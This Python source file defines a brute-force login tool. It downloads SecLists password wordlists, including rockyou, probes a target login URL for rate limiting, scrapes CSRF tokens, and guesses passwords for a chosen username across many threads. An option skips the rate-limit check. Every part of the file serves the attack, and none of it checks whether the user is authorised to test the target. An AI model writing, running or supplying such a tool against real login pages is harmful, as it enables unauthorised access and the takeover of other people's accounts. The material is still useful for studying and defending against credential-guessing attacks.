import requests
from colorama import Fore
import os
import time
import re
import concurrent.futures

class BruteForcer:
    def __init__(self):
        self.wordlists = {
            "top1000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
            "top10000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
            "top100000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
            "rockyou": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",
            "phpbb": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/phpbb.txt",
            "darkweb2017": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt",
            "probable_v2": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top12000.txt",
            "xato_top1000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt",
            "common_roots": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/common-passwords-win.txt",
        }
        self.wordlist_dir = "wordlists"
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir)

    def download_wordlist(self, name="top1000"):
        url = self.wordlists.get(name, self.wordlists["top1000"])
        filename = os.path.join(self.wordlist_dir, f"{name}.txt")
        
        if not os.path.exists(filename):
            print(f"{Fore.CYAN}[*] Downloading wordlist ({name}) from SecLists...")
            try:
                r = requests.get(url, stream=True, timeout=60)
                if r.status_code == 200:
                    with open(filename, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)
                    print(f"{Fore.GREEN}[+] Download complete: {filename}")
                else:
                    print(f"{Fore.RED}[!] Failed to download wordlist '{name}' (HTTP {r.status_code}). Falling back to top1000.")
                    if name != "top1000":
                        return self.download_wordlist("top1000")
            except Exception as e:
                print(f"{Fore.RED}[!] Error downloading wordlist: {e}")
                if name != "top1000":
                    return self.download_wordlist("top1000")
        else:
            print(f"{Fore.GREEN}[+] Wordlist '{name}' already cached: {filename}")
        
        return filename

    def detect_rate_limiting(self, target_url, username_field="username", password_field="password"):
        """
        Probes the target with 5 rapid intentional failures to detect rate limiting.
        Returns: (is_rate_limited: bool, details: str)
        """
        print(f"{Fore.CYAN}[*] Probing for rate limiting on {target_url}...")
        
        session = requests.Session()
        response_times = []
        rate_limited = False
        details = ""

        # First, fetch the login page to get any CSRF tokens / cookies
        try:
            session.get(target_url, timeout=10)
        except Exception:
            pass

        for i in range(8):
            data = {
                username_field: "rate_limit_test_user",
                password_field: f"wrong_password_{i}_{time.time()}"
            }
            try:
                start = time.time()
                res = session.post(target_url, data=data, timeout=10, allow_redirects=True)
                elapsed = time.time() - start
                response_times.append(elapsed)
                
                # Check for HTTP 429 Too Many Requests
                if res.status_code == 429:
                    rate_limited = True
                    details = f"HTTP 429 received after {i+1} attempts."
                    break
                
                # Check for Retry-After header
                if 'Retry-After' in res.headers:
                    rate_limited = True
                    details = f"Retry-After header detected: {res.headers['Retry-After']}"
                    break
                
                # Check for lockout / CAPTCHA indicators in response body
                body = res.text.lower()
                lockout_indicators = [
                    "too many", "rate limit", "locked", "captcha",
                    "temporarily blocked", "try again later", "account locked",
                    "maximum attempts", "slow down", "throttl", "banned",
                    "blocked", "exceeded", "wait before"
                ]
                if any(indicator in body for indicator in lockout_indicators):
                    rate_limited = True
                    matched = [ind for ind in lockout_indicators if ind in body]
                    details = f"Lockout keywords detected after {i+1} attempts: {matched[:3]}"
                    break

                # Small delay between probes
                time.sleep(0.1)
                
            except requests.exceptions.Timeout:
                # Server slowing down responses = possible rate limiting
                if i >= 3:
                    rate_limited = True
                    details = f"Request timeout after {i+1} attempts (possible throttling)."
                    break
            except Exception:
                pass

        # Check for progressive response time increase (sign of tarpit/delay-based limiting)
        if not rate_limited and len(response_times) >= 5:
            # If last 3 responses are >2x slower than first 2, likely throttled
            avg_first = sum(response_times[:2]) / 2 if response_times[:2] else 0
            avg_last = sum(response_times[-3:]) / 3 if response_times[-3:] else 0
            if avg_first > 0 and avg_last > avg_first * 2.5:
                rate_limited = True
                details = f"Progressive slowdown detected: {avg_first:.2f}s → {avg_last:.2f}s avg response time."

        if rate_limited:
            print(f"{Fore.YELLOW}[!] Rate Limiting DETECTED: {details}")
            print(f"{Fore.YELLOW}[!] Brute force will NOT proceed (target is protected).")
        else:
            print(f"{Fore.GREEN}[+] No rate limiting detected. Target may be vulnerable to brute force.")
        
        return rate_limited, details

    def extract_csrf_token(self, session, url):
        """
        Fetches the login page and extracts any hidden CSRF token.
        """
        try:
            res = session.get(url, timeout=10)
            # Look for common CSRF hidden fields
            csrf_patterns = [
                r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)',
                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
                r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)',
                r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)',
                r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)',
                # Reverse order (value before name)
                r'value=["\']([^"\']+)["\'][^>]*name=["\']csrf[_-]?token["\']',
                r'value=["\']([^"\']+)["\'][^>]*name=["\']_token["\']',
            ]
            for pattern in csrf_patterns:
                match = re.search(pattern, res.text, re.IGNORECASE)
                if match:
                    token = match.group(1)
                    # Find the field name
                    name_match = re.search(r'name=["\']([^"\']+)["\']', match.group(0))
                    field_name = name_match.group(1) if name_match else "csrf_token"
                    print(f"{Fore.CYAN}[*] CSRF token extracted: {field_name}={token[:20]}...")
                    return field_name, token
        except Exception:
            pass
        return None, None

    def run(self, target_url, username, wordlist_name="top1000", threads=5, 
            username_field="username", password_field="password", skip_rate_check=False):
        """
        Main brute force runner.
        """
        print(f"{Fore.CYAN}[*] Starting Brute Force on {target_url} (User: {username}) using '{wordlist_name}' wordlist...")
        
        # Rate limit detection (unless skipped)
        if not skip_rate_check:
            is_limited, limit_details = self.detect_rate_limiting(
                target_url, username_field, password_field
            )
            if is_limited:
                return None  # Do not brute-force rate-limited targets
        
        wordlist_path = self.download_wordlist(wordlist_name)
        if not os.path.exists(wordlist_path):
            print(f"{Fore.RED}[Error] Wordlist not found.")
            return None

        found_password = None
        attempt_count = 0
        
        # Load passwords (stream for large files)
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        total = len(passwords)
        print(f"{Fore.CYAN}[*] Loaded {total} passwords from '{wordlist_name}'.")

        # Create a session for cookie/CSRF handling
        session = requests.Session()
        csrf_field, csrf_token = self.extract_csrf_token(session, target_url)

        def try_login(password):
            nonlocal found_password, attempt_count
            if found_password: return
            
            attempt_count += 1
            if attempt_count % 500 == 0:
                print(f"{Fore.CYAN}[*] Progress: {attempt_count}/{total} ({(attempt_count/total)*100:.1f}%)")
            
            data = {
                username_field: username,
                password_field: password,
            }
            
            # Also send common alternative field names for compatibility
            alt_fields = {
                "uname": username, "pass": password,
                "user": username, "pwd": password,
                "login": username, "passwd": password,
                "email": username,
            }
            # Only add alts that don't conflict with primary fields
            for k, v in alt_fields.items():
                if k not in data:
                    data[k] = v

            # Add CSRF token if found
            if csrf_field and csrf_token:
                data[csrf_field] = csrf_token
            
            try:
                res = session.post(target_url, data=data, timeout=5, allow_redirects=True)
                
                if self.is_success(res):
                    found_password = password
                    print(f"{Fore.GREEN}[!!!] PASSWORD FOUND: {password}")
                    return password
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(try_login, pwd) for pwd in passwords]
            
            for future in concurrent.futures.as_completed(futures):
                if found_password:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        if found_password:
            return found_password
        else:
            print(f"{Fore.YELLOW}[-] Brute force finished ({total} passwords tried). Password not found.")
            return None

    def is_success(self, res):
        if res.status_code != 200: return False
        text = res.text.lower()
        
        fail_terms = ["invalid", "incorrect", "fail", "denied", "wrong", "error", "try again"]
        if any(term in text for term in fail_terms):
            return False
        
        success_terms = ["welcome", "logout", "dashboard", "my account", "profile", "token", "session"]
        if any(term in text for term in success_terms):
            return True
        
        return False
